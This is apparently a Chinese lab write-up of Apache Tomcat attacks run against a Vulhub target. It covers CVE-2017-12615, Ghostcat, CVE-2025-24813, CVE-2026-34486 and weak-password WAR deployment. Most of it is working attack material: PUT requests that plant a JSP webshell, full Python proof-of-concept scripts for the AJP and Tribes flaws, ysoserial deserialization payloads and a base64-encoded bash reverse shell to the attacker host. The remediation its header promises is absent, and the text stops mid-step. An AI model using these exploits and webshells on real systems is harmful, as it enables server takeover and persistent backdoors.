---
title: Apache Tomcat
published: 2026-10-12T09:00:00+08:00
description: 全面解析 Apache Tomcat 的多个高危漏洞，涵盖 CVE-2017-12615（PUT 方法任意写文件）、CVE-2020-1938（Ghostcat AJP 文件包含）、CVE-2025-24813（会话持久化反序列化 RCE）、CVE-2026-34486（Tribes EncryptInterceptor 绕过 RCE）以及 Tomcat 弱口令后台 Getshell 的原理分析、利用手法及实战修复方案。
image: images/Pasted image 20261011085813.png
tags:
  - Vulhub
  - CVE
category: Vulhub靶场
draft: false
pinned: false
lang: zh-CN
author: Ynm
comment: true
---

| 项目          | 详情                                                                                                   |
| ----------- | ---------------------------------------------------------------------------------------------------- |
| **攻击机**     | Kali Linux（IP：192.168.197.128）                                                                       |
| **靶机**      | Ubuntu Server 24.04（IP：192.168.197.88）                                                               |
| **CVSS 评分** | CVE-2017-12615: 8.1（高危） / CVE-2020-1938: 9.8（严重） / CVE-2025-24813: 9.8（严重） / CVE-2026-34486: 9.8（严重） |
| **典型漏洞编号**  | CVE-2017-12615 / CVE-2020-1938 / CVE-2025-24813 / CVE-2026-34486 / Tomcat 弱口令                        |
| **影响组件**    | Apache Tomcat 8.5.19 / 9.0.30 / 9.0.97 / 9.0.116 等                                                   |
| **漏洞类型**    | 任意文件写入 / 文件包含 / 反序列化 RCE / 认证绕过 / 弱口令                                                                |
| **利用条件**    | 特定错误配置（readonly=false、AJP 开启、Session 持久化、Tribes 启用、弱口令等）                                             |
| **核心原理**    | DefaultServlet 配置缺陷、AJP 协议设计缺陷、反序列化与集群通信缺陷                                                           |
## 一、漏洞原理

Apache Tomcat 是当前最流行的 Java 中间件服务器之一，为 Java Servlet、JSP、WebSocket 等技术提供运行环境。Tomcat 的漏洞家族主要围绕三条技术主线展开：**DefaultServlet 配置缺陷**、**AJP 协议设计缺陷**以及**反序列化与集群通信缺陷**。

**DefaultServlet 配置缺陷**是 Tomcat 多个漏洞的根源。当 `conf/web.xml` 中 DefaultServlet 的 `readonly` 参数被设置为 `false` 时，Tomcat 允许通过 HTTP PUT 方法向服务器写入文件。虽然 Tomcat 对 `.jsp` 后缀做了检测，但攻击者可利用文件系统特性（如 Linux 下的 `/` 路径分隔符）绕过限制，写入 JSP Webshell。CVE-2017-12615 就是这类漏洞的典型代表。

**AJP 协议设计缺陷**是 CVE-2020-1938（Ghostcat）的根源。Tomcat 的 AJP（Apache JServ Protocol）连接器用于与前置 HTTP 服务器（如 Apache httpd）通信，默认监听 8009 端口。由于 AJP 协议在设计上允许客户端通过 `javax.servlet.include.*` 属性控制请求的转发目标，攻击者可以读取 Tomcat 上所有 webapp 目录下的任意文件。若目标应用存在文件上传功能，还可以配合文件包含实现远程代码执行。

**反序列化与集群通信缺陷**则涉及 CVE-2025-24813 和 CVE-2026-34486。前者利用 Tomcat 的会话持久化机制与部分 PUT 请求的路径转换特性，向会话存储目录写入恶意序列化对象，再通过操作 `JSESSIONID` cookie 触发反序列化；后者则利用 Tomcat Tribes 集群框架中 EncryptInterceptor 的绕过缺陷，向 4000 端口发送未加密的 Java 反序列化 payload，直接触发 RCE。

此外，**弱口令与后台管理**是 Tomcat 实战中最常见的入口之一。若管理员在 `conf/tomcat-users.xml` 中配置了弱口令用户，攻击者即可登录 manager 后台，上传 war 包直接获得 Webshell。

## 二、漏洞复现

### 1. CVE-2017-12615（PUT 方法任意写文件）

Tomcat 8.5.19 版本中，由于 DefaultServlet 配置了 `readonly=false`，攻击者可通过 PUT 方法向服务器写入任意文件。

DefaultServlet的关键部分如下：
```text {13,14} wrap
<servlet>
    <servlet-name>default</servlet-name>
    <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
    <init-param>
        <param-name>debug</param-name>
        <param-value>0</param-value>
    </init-param>
    <init-param>
        <param-name>listings</param-name>
        <param-value>false</param-value>
    </init-param>
    <init-param>
        <param-name>readonly</param-name>
        <param-value>false</param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
</servlet>
```

**① 发送 PUT 请求写入一个字符串进行测试**

由于 Tomcat 对 `.jsp` 后缀有检测，需要在文件名末尾加 `/` 绕过：

```http wrap
PUT /1.jsp/ HTTP/1.1
Host: 192.168.197.88:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

shell
```
![](images/Pasted%20image%2020261011092635.png)
**② 访问网页**

访问 `http://192.168.197.88:8080/1.jsp`，若能看到 `shell` 内容，说明文件写入成功。将内容替换为 JSP Webshell 即可执行任意命令。
![](images/Pasted%20image%2020261011093009.png)
**③ 替换为 JSP Webshell 并使用蚁剑连接**

将之前 PUT 请求中的 `shell` 替换为蚁剑可用的 JSP 木马内容，重新发送请求写入 `1.jsp`，即可通过蚁剑连接获取 Webshell。

以下是一段蚁剑可用的 JSP 一句话木马（密码为 `pass`）：

```jsp wrap
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%!
    class U extends ClassLoader {
        U(ClassLoader c) { super(c); }
        public Class g(byte[] b) { return super.defineClass(b, 0, b.length); }
    }
    public byte[] base64Decode(String str) throws Exception {
        return new sun.misc.BASE64Decoder().decodeBuffer(str);
    }
%>
<%
    if (request.getParameter("pass") != null) {
        byte[] b = base64Decode(request.getParameter("pass"));
        new U(this.getClass().getClassLoader()).g(b).newInstance().equals(pageContext);
    }
%>
```

在 Burp Repeater 中修改请求体为上面的 JSP 代码，注意 `Content-Length` 要改为实际长度，并保持 `PUT /1.jsp/ HTTP/1.1` 不变：

```http wrap
PUT /1.jsp/ HTTP/1.1
Host: 192.168.197.88:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 612

<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%!
    class U extends ClassLoader {
        U(ClassLoader c) { super(c); }
        public Class g(byte[] b) { return super.defineClass(b, 0, b.length); }
    }
    public byte[] base64Decode(String str) throws Exception {
        return new sun.misc.BASE64Decoder().decodeBuffer(str);
    }
%>
<%
    if (request.getParameter("pass") != null) {
        byte[] b = base64Decode(request.getParameter("pass"));
        new U(this.getClass().getClassLoader()).g(b).newInstance().equals(pageContext);
    }
%>
```

发送请求后，若响应状态码为 **204 （或其他 2xx 状态码）**，说明 JSP 文件已成功写入 Web 根目录。

![](images/Pasted%20image%2020261011093541.png)

此时浏览器访问：
```text wrap
http://192.168.197.88:8080/1.jsp
```
如果页面空白且没有报错，说明木马已正常部署。

打开蚁剑（AntSword），右键“添加数据”，填写以下信息：

| 配置项    | 值                                  |
| ------ | ---------------------------------- |
| URL 地址 | `http://192.168.197.88:8080/1.jsp` |
| 连接密码   | `pass`                             |

点击“测试连接”，若显示“连接成功”，即可进入文件管理、命令执行等操作，获得完整的 Webshell 控制权限。

![](images/Pasted%20image%2020261011093748.png)

### 2. CVE-2020-1938（Ghostcat AJP 文件包含）

Ghostcat（幽灵猫）是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。

Tomcat AJP 协议默认监听 8009 端口，攻击者可通过该端口读取 webapp 目录下的任意文件。

**① 使用在线工具测试**

可使用以下工具进行漏洞验证：**`https://www.chaitin.cn/zh/ghostcat（该网站已失效）`**

**② 利用POC脚本方式**

利用目录下的POC脚本：
```python wrap
# -*- coding: utf-8 -*-
#!/usr/bin/env python
#修改自 CNVD-2020-10487  Tomcat-Ajp lfi
#by zwliu2
import struct
from io import StringIO

# Some references:
# https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html
def pack_string(s):
	if s is None:
		return struct.pack(">h", -1)
	l = len(s)
	return struct.pack(">H%dsb" % l, l, s.encode('utf8'), 0)
def unpack(stream, fmt):
	size = struct.calcsize(fmt)
	buf = stream.read(size)
	return struct.unpack(fmt, buf)
def unpack_string(stream):
	size, = unpack(stream, ">h")
	if size == -1: # null string
		return None
	res, = unpack(stream, "%ds" % size)
	stream.read(1) # \0
	return res
class NotFoundException(Exception):
	pass
class AjpBodyRequest(object):
	# server == web server, container == servlet
	SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)
	MAX_REQUEST_LENGTH = 8186
	def __init__(self, data_stream, data_len, data_direction=None):
		self.data_stream = data_stream
		self.data_len = data_len
		self.data_direction = data_direction
	def serialize(self):
		data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)
		if len(data) == 0:
			return struct.pack(">bbH", 0x12, 0x34, 0x00)
		else:
			res = struct.pack(">H", len(data))
			res += data
		if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:
			header = struct.pack(">bbH", 0x12, 0x34, len(res))
		else:
			header = struct.pack(">bbH", 0x41, 0x42, len(res))
		return header + res
	def send_and_receive(self, socket, stream):
		while True:
			data = self.serialize()
			socket.send(data)
			r = AjpResponse.receive(stream)
			while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS:
				r = AjpResponse.receive(stream)

			if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:
				break
class AjpForwardRequest(object):
	_, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28)
	REQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE, 'TRACE': TRACE}
	# server == web server, container == servlet
	SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)
	COMMON_HEADERS = ["SC_REQ_ACCEPT",
		"SC_REQ_ACCEPT_CHARSET", "SC_REQ_ACCEPT_ENCODING", "SC_REQ_ACCEPT_LANGUAGE", "SC_REQ_AUTHORIZATION",
		"SC_REQ_CONNECTION", "SC_REQ_CONTENT_TYPE", "SC_REQ_CONTENT_LENGTH", "SC_REQ_COOKIE", "SC_REQ_COOKIE2",
		"SC_REQ_HOST", "SC_REQ_PRAGMA", "SC_REQ_REFERER", "SC_REQ_USER_AGENT"
	]
	ATTRIBUTES = ["context", "servlet_path", "remote_user", "auth_type", "query_string", "route", "ssl_cert", "ssl_cipher", "ssl_session", "req_attribute", "ssl_key_size", "secret", "stored_method"]
	def __init__(self, data_direction=None):
		self.prefix_code = 0x02
		self.method = None
		self.protocol = None
		self.req_uri = None
		self.remote_addr = None
		self.remote_host = None
		self.server_name = None
		self.server_port = None
		self.is_ssl = None
		self.num_headers = None
		self.request_headers = None
		self.attributes = None
		self.data_direction = data_direction
	def pack_headers(self):
		self.num_headers = len(self.request_headers)
		res = ""
		res = struct.pack(">h", self.num_headers)
		for h_name in self.request_headers:
			if h_name.startswith("SC_REQ"):
				code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1
				res += struct.pack("BB", 0xA0, code)
			else:
				res += pack_string(h_name)

			res += pack_string(self.request_headers[h_name])
		return res

	def pack_attributes(self):
		res = b""
		for attr in self.attributes:
			a_name = attr['name']
			code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1
			res += struct.pack("b", code)
			if a_name == "req_attribute":
				aa_name, a_value = attr['value']
				res += pack_string(aa_name)
				res += pack_string(a_value)
			else:
				res += pack_string(attr['value'])
		res += struct.pack("B", 0xFF)
		return res
	def serialize(self):
		res = ""
		res = struct.pack("bb", self.prefix_code, self.method)
		res += pack_string(self.protocol)
		res += pack_string(self.req_uri)
		res += pack_string(self.remote_addr)
		res += pack_string(self.remote_host)
		res += pack_string(self.server_name)
		res += struct.pack(">h", self.server_port)
		res += struct.pack("?", self.is_ssl)
		res += self.pack_headers()
		res += self.pack_attributes()
		if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:
			header = struct.pack(">bbh", 0x12, 0x34, len(res))
		else:
			header = struct.pack(">bbh", 0x41, 0x42, len(res))
		return header + res
	def parse(self, raw_packet):
		stream = StringIO(raw_packet)
		self.magic1, self.magic2, data_len = unpack(stream, "bbH")
		self.prefix_code, self.method = unpack(stream, "bb")
		self.protocol = unpack_string(stream)
		self.req_uri = unpack_string(stream)
		self.remote_addr = unpack_string(stream)
		self.remote_host = unpack_string(stream)
		self.server_name = unpack_string(stream)
		self.server_port = unpack(stream, ">h")
		self.is_ssl = unpack(stream, "?")
		self.num_headers, = unpack(stream, ">H")
		self.request_headers = {}
		for i in range(self.num_headers):
			code, = unpack(stream, ">H")
			if code > 0xA000:
				h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001]
			else:
				h_name = unpack(stream, "%ds" % code)
				stream.read(1) # \0
			h_value = unpack_string(stream)
			self.request_headers[h_name] = h_value
	def send_and_receive(self, socket, stream, save_cookies=False):
		res = []
		i = socket.sendall(self.serialize())
		if self.method == AjpForwardRequest.POST:
			return res

		r = AjpResponse.receive(stream)
		assert r.prefix_code == AjpResponse.SEND_HEADERS
		res.append(r)
		if save_cookies and 'Set-Cookie' in r.response_headers:
			self.headers['SC_REQ_COOKIE'] = r.response_headers['Set-Cookie']

		# read body chunks and end response packets
		while True:
			r = AjpResponse.receive(stream)
			res.append(r)
			if r.prefix_code == AjpResponse.END_RESPONSE:
				break
			elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK:
				continue
			else:
				raise NotImplementedError
				break

		return res

class AjpResponse(object):
	_,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7)
	COMMON_SEND_HEADERS = [
			"Content-Type", "Content-Language", "Content-Length", "Date", "Last-Modified",
			"Location", "Set-Cookie", "Set-Cookie2", "Servlet-Engine", "Status", "WWW-Authenticate"
			]
	def parse(self, stream):
		# read headers
		self.magic, self.data_length, self.prefix_code = unpack(stream, ">HHb")
		if self.prefix_code == AjpResponse.SEND_HEADERS:
			self.parse_send_headers(stream)
		elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:
			self.parse_send_body_chunk(stream)
		elif self.prefix_code == AjpResponse.END_RESPONSE:
			self.parse_end_response(stream)
		elif self.prefix_code == AjpResponse.GET_BODY_CHUNK:
			self.parse_get_body_chunk(stream)
		else:
			raise NotImplementedError

	def parse_send_headers(self, stream):
		self.http_status_code, = unpack(stream, ">H")
		self.http_status_msg = unpack_string(stream)
		self.num_headers, = unpack(stream, ">H")
		self.response_headers = {}
		for i in range(self.num_headers):
			code, = unpack(stream, ">H")
			if code <= 0xA000: # custom header
				h_name, = unpack(stream, "%ds" % code)
				stream.read(1) # \0
				h_value = unpack_string(stream)
			else:
				h_name = AjpResponse.COMMON_SEND_HEADERS[code-0xA001]
				h_value = unpack_string(stream)
			self.response_headers[h_name] = h_value

	def parse_send_body_chunk(self, stream):
		self.data_length, = unpack(stream, ">H")
		self.data = stream.read(self.data_length+1)

	def parse_end_response(self, stream):
		self.reuse, = unpack(stream, "b")

	def parse_get_body_chunk(self, stream):
		rlen, = unpack(stream, ">H")
		return rlen

	@staticmethod
	def receive(stream):
		r = AjpResponse()
		r.parse(stream)
		return r

import socket

def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):
	fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
	fr.method = method
	fr.protocol = "HTTP/1.1"
	fr.req_uri = req_uri
	fr.remote_addr = target_host
	fr.remote_host = None
	fr.server_name = target_host
	fr.server_port = 80
	fr.request_headers = {
		'SC_REQ_ACCEPT': 'text/html',
		'SC_REQ_CONNECTION': 'keep-alive',
		'SC_REQ_CONTENT_LENGTH': '0',
		'SC_REQ_HOST': target_host,
		'SC_REQ_USER_AGENT': 'Mozilla',
		'Accept-Encoding': 'gzip, deflate, sdch',
		'Accept-Language': 'en-US,en;q=0.5',
		'Upgrade-Insecure-Requests': '1',
		'Cache-Control': 'max-age=0'
	}
	fr.is_ssl = False
	fr.attributes = []
	return fr

class Tomcat(object):
	def __init__(self, target_host, target_port):
		self.target_host = target_host
		self.target_port = target_port
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.socket.connect((target_host, target_port))
		self.stream = self.socket.makefile("rb", bufsize=0)

	def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):
		self.req_uri = req_uri
		self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))
		print("Getting resource at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))
		if user is not None and password is not None:
			self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + ("%s:%s" % (user, password)).encode('base64').replace('\n', '')
		for h in headers:
			self.forward_request.request_headers[h] = headers[h]
		for a in attributes:
			self.forward_request.attributes.append(a)
		responses = self.forward_request.send_and_receive(self.socket, self.stream)
		if len(responses) == 0:
			return None, None
		snd_hdrs_res = responses[0]
		data_res = responses[1:-1]
		if len(data_res) == 0:
			print("No data in response. Headers:%s\n" % snd_hdrs_res.response_headers)
		return snd_hdrs_res, data_res

'''
javax.servlet.include.request_uri
javax.servlet.include.path_info
javax.servlet.include.servlet_path
'''

import argparse
parser = argparse.ArgumentParser()
parser.add_argument("target", type=str, help="Hostname or IP to attack")
parser.add_argument('-p', '--port', type=int, default=8009, help="AJP port to attack (default is 8009)")
parser.add_argument("-f", '--file', type=str, default='WEB-INF/web.xml', help="file path :(WEB-INF/web.xml)")
args = parser.parse_args()
t = Tomcat(args.target, args.port)
_,data = t.perform_request('/asdf',attributes=[
    {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']},
    {'name':'req_attribute','value':['javax.servlet.include.path_info',args.file]},
    {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']},
    ])
print('----------------------------')
print("".join([d.data for d in data]))
```

执行该POC脚本：
```text wrap
python2 poc.py 192.168.197.88 -p 8009 -f WEB-INF/web.xml
```

该脚本会读取 Tomcat 的 `WEB-INF/web.xml` 配置文件。若目标应用存在文件上传功能，可配合该文件包含漏洞实现 RCE（注意：这里漏洞的效果是任意文件读取，但是任意文件读取的原理是利用 AJP 协议的 include 属性，欺骗 Tomcat 去读取任意文件，因此可以实现文件包含，但它在这里的直接效果是任意文件读取）。
![](images/Pasted%20image%2020261011104624.png)
### 3. CVE-2025-24813（会话持久化反序列化 RCE）

Tomcat 9.0.97 及更早版本中，当同时配置了 `readonly=false` 和基于文件的 Session 持久化时，攻击者可通过部分 PUT 请求向会话存储目录写入恶意序列化对象，再通过 `JSESSIONID` 触发反序列化，最终导致远程代码执行。

> **说明**：Vulhub 靶场默认未包含 CommonsCollections 等第三方 Gadget 库，因此无法直接执行系统命令。我们可以先用 **URLDNS 链**验证反序列化漏洞是否存在，再讨论 RCE 利用。

**① 生成 URLDNS Payload**

URLDNS 链仅依赖 JDK 内置类，不需要任何第三方库，非常适合用于漏洞验证。

这里使用DNSLog平台，网站为`https://dnslog.org/`。

同时需要使用ysoserial，下载链接如下（ysoserial 是 Java 反序列化利用的权威工具，可以生成各种 Gadget 链的序列化数据。）：
```text wrap
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
```
然后使用ysoserial生成**序列化 Payload 文件**，命令如下：
```text wrap
java --add-opens=java.base/java.util=ALL-UNNAMED \
     --add-opens=java.base/java.net=ALL-UNNAMED \
     -jar ysoserial-all.jar URLDNS "http://29d8d7ab.log.dnslog.pp.ua." > payload.ser
```

注意将上面 `http://29d8d7ab.log.dnslog.pp.ua.` 替换为你自己的 DNSLog 域名即可。

**② 写入 Session 文件**

获取 `payload.ser` 的字节长度，然后发送带 `Content-Range` 头的 PUT 请求：

```text wrap
L=$(stat -c%s payload.ser)
curl -X PUT "http://192.168.197.88:8080/deserialize/session" \
  -H "Content-Type: application/octet-stream" \
  -H "Content-Range: bytes 0-$((L-1))/$L" \
  --data-binary @payload.ser
```

**预期响应**：`HTTP/1.1 409 Conflict`。这是正常现象，表示 Tomcat 已将文件临时写入会话存储目录。

![](images/Pasted%20image%2020261012115240.png)

**③ 触发反序列化**

发送带有特殊 `JSESSIONID` cookie 的 GET 请求：

```text wrap
curl "http://192.168.197.88:8080/" -H "Cookie: JSESSIONID=.deserialize"
```

**预期响应**：`HTTP/1.1 500 Internal Server Error`，错误信息为 `java.util.HashMap cannot be cast to java.lang.Long`。这也是正常现象——Tomcat 期望反序列化出一个 Session 对象，而我们提供的是 URLDNS 链的 HashMap，因此会抛出类型转换异常。**这恰好证明反序列化已被触发。**
![](images/Pasted%20image%2020261012111729.png)

**④ 验证 DNS 请求**

登录 DNSLog 平台，查看是否收到来自靶机 IP 的 DNS 查询记录。如果有，则漏洞验证成功。

![](images/Pasted%20image%2020261012111441.png)

 **⑤ 进一步利用（补充）**

若需执行系统命令，需要向靶场容器添加 `commons-collections` 库（因为靶场中没有），然后使用 `CommonsCollections6` 链生成 Payload，重复步骤 ② 和 ③ 即可获得 RCE。

```text wrap
# 生成 RCE Payload
java --add-opens=java.base/java.util=ALL-UNNAMED \
     --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
     --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens=java.base/java.net=ALL-UNNAMED \
     -jar ysoserial-all.jar CommonsCollections6 "touch /tmp/success" > payload.ser
```

之后按相同步骤写入并触发，再进入容器验证 `/tmp/success` 是否被创建。

### 4. CVE-2026-34486（Tribes EncryptInterceptor 绕过 RCE）

Tomcat Tribes 是 Tomcat 推出的集群框架，启用了 Tribes 的多个 Tomcat 实例之间会通过 Java 序列化机制交换消息；当配置了 `EncryptInterceptor` 后，这些序列化字节流会被加密传输。正常情况下，接收消息的 Tomcat 实例只有在解密成功后才会对消息进行反序列化，但官方在修复 CVE-2026-29146（Tribes EncryptInterceptor Padding Oracle 漏洞）时引入了一个 Bug，导致消息解密失败时后续处理流程没有被中止，字节流无论解密是否成功都会被继续转发给下层处理器，进而被反序列化执行。攻击者只需具备 Tribes 接收端口（默认 4000）的网络访问权限，即可向其发送包含 Java 反序列化 payload 的未加密消息，完全绕过 EncryptInterceptor 的加密保护，实现远程代码执行。该漏洞影响 Apache Tomcat 9.0.116、10.1.53 和 11.0.20 版本。

满足以下条件的 Tomcat 才可以被利用：

- `<Cluster>` 在 `server.xml` 中显式启用
- `<Cluster>` 的 Channel 中配置了 `EncryptInterceptor`（未配置此拦截器的 Tribes 本就直接接受未加密消息，不属于该 CVE 的利用范畴）
- Tribes 接收端口对攻击者网络可达（默认监听在 4000 端口）
- classpath 中存在可用的反序列化利用链（如 Apache Commons Collections）

**① 生成序列化 payload**

由于漏洞容器中 classpath 已包含 `commons-collections 3.2.1`，可以使用任意 Apache Commons Collections 反序列化链来执行任意系统命令。

首先，使用 ysoserial 生成序列化 payload：
```text wrap
java \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections6 "touch /tmp/success" > payload.ser
```
![](images/Pasted%20image%2020261012121854.png)
**② 发送 payload 到 Tribes 端口**

然后使用目录的 `poc.py` 脚本将 payload 封装进 Tribes 数据帧，发送到接收端口：
```text wrap
python3 poc.py -t 192.168.197.88 -p 4000 -f payload.ser
```

![](images/Pasted%20image%2020261012122324.png)

`poc.py` 脚本如下：
```python wrap
#!/usr/bin/env python3
import argparse
import io
import socket
import struct
import sys
import time
HEADER = b"FLT2002"
FOOTER = b"TLF2003"
MEMBER_BEGIN = b"TRIBES-B\x01\x00"
MEMBER_END = b"TRIBES-E\x01\x00"

def build_member():
    p = io.BytesIO()
    p.write(struct.pack(">q", 0))
    p.write(struct.pack(">I", 4001))
    p.write(struct.pack(">I", 0))
    p.write(struct.pack(">I", 0))
    host = socket.inet_aton("127.0.0.1")
    p.write(struct.pack(">B", len(host)))
    p.write(host)
    p.write(struct.pack(">I", 0))
    p.write(struct.pack(">I", 0))
    p.write(b"\x00" * 16)
    p.write(struct.pack(">I", 0))
    body = p.getvalue()
    return MEMBER_BEGIN + struct.pack(">I", len(body)) + body + MEMBER_END

def build_packet(payload: bytes) -> bytes:
    b = io.BytesIO()
    b.write(struct.pack(">I", 0x0008))
    b.write(struct.pack(">Q", int(time.time() * 1000)))
    uuid = b"\x01" * 16
    b.write(struct.pack(">I", len(uuid)))
    b.write(uuid)
    member = build_member()
    b.write(struct.pack(">I", len(member)))
    b.write(member)
    b.write(struct.pack(">I", len(payload)))
    b.write(payload)
    data = b.getvalue()
    return HEADER + struct.pack(">I", len(data)) + data + FOOTER

def send(host: str, port: int, packet: bytes, timeout: float) -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((host, port))
        s.sendall(packet)
        s.shutdown(socket.SHUT_WR)
        try:
            s.recv(1)
        except (socket.timeout, OSError):
            pass

def parse_args():
    parser = argparse.ArgumentParser(
        description="CVE-2026-34486 - Tomcat Tribes EncryptInterceptor Bypass RCE",
        epilog=(
            "Generate a serialized payload first, e.g.:\n"
            "  java -jar ysoserial.jar CommonsCollections6 'touch /tmp/success' > payload.ser\n"
            "Then send it:\n"
            "  %(prog)s -t 127.0.0.1 -p 4000 -f payload.ser"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("-t", "--target", required=True, help="Tomcat Tribes receiver host")
    parser.add_argument("-p", "--port", type=int, default=4000, help="Tribes receiver port (default: 4000)")
    parser.add_argument(
        "-f", "--file", required=True,
        help="Path to a Java serialized payload file (e.g. generated by ysoserial)",
    )
    parser.add_argument("--timeout", type=float, default=3.0, help="Socket timeout in seconds (default: 3)")
    return parser.parse_args()

def main():
    args = parse_args()
    try:
        with open(args.file, "rb") as f:
            payload = f.read()
    except OSError as e:
        print(f"[!] Failed to read payload file: {e}")
        sys.exit(1)
    print(f"[*] CVE-2026-34486 Tomcat Tribes EncryptInterceptor Bypass RCE")
    print(f"[*] Target: {args.target}:{args.port}  Payload file: {args.file}")
    packet = build_packet(payload)
    print(f"[+] Payload: {len(payload)}B  Packet: {len(packet)}B")
    try:
        send(args.target, args.port, packet, args.timeout)
    except OSError as e:
        print(f"[!] Send failed: {e}")
        sys.exit(1)
    print("[+] Sent!")

if __name__ == "__main__":
    main()
```
**③ 验证命令执行**

```text wrap
docker-compose exec tomcat ls -l /tmp
```

若文件存在，说明反序列化成功执行。

![](images/Pasted%20image%2020261012122450.png)

**④ 补充：反弹 Shell**

将 `touch /tmp/success` 替换为反弹 Shell 命令，重新生成 Payload：

```text wrap
java --add-opens=java.base/java.util=ALL-UNNAMED \
     --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
     --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens=java.base/java.net=ALL-UNNAMED \
     -jar ysoserial-all.jar CommonsCollections6 \
     "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xMjgvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" > payload.ser
```

然后重复发送步骤，并在 Kali 上启动监听：

```text wrap
nc -lvnp 4444
```

若一切顺利，即可获得目标容器的反弹 Shell，这里不再演示。
### 5. Tomcat7+ 弱口令 & 后台 Getshell

Tomcat 8.0 版本中（这个漏洞的利用方式从 Tomcat 7 开始就存在，一直延续到后续版本，标题用“**Tomcat7+**”来概括“7 及以上所有版本”；而本次靶场环境用的是 Tomcat 8.0），若管理员配置了弱口令用户，攻击者可登录 manager 后台上传 war 包获取 Webshell。

**① 登录后台**

访问 `http://192.168.197.88:8080/manager/html`，输入弱密码：

```text wrap
用户名：tomcat
密码：tomcat
```
![](images/Pasted%20image%2020261012123904.png)

**② 制作 war 包**

在 Kali 桌面新建一个文本文件，命名为 shell.jsp，内容如下（这是一个蚁剑可用的 JSP 木马，密码为 pass）：
```jsp wrap
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%!
    class U extends ClassLoader {
        U(ClassLoader c) { super(c); }
        public Class g(byte[] b) { return super.defineClass(b, 0, b.length); }
    }
    public byte[] base64Decode(String str) throws Exception {
        return new sun.misc.BASE64Decoder().decodeBuffer(str);
    }
%>
<%
    if (request.getParameter("pass") != null) {
        byte[] b = base64Decode(request.getParameter("pass"));
        new U(this.getClass().getClassLoader()).g(b).newInstance().equals(pageContext);
    }
%>
```
使用 zip 命令生成 war 包（WAR 本质就是 ZIP）：
```text wrap
cd /root/桌面
zip shell.war shell.jsp
```
**③ 上传 war 包**

登录后台后，在 WAR file to deploy 区域选择 shell.war，点击 Deploy。Tomcat 会自动解压到 /shell/ 目录下。
![](images/Pasted%20image%2020261012125317.png)

**④ 访问木马**

浏览器访问：

```text wrap
http://192.168.197.88:8080/shell/shell.jsp
```

如果页面空白且没有报错，说明木马部署成功。

**⑤ 使用蚁剑连接**

打开蚁剑，添加数据：

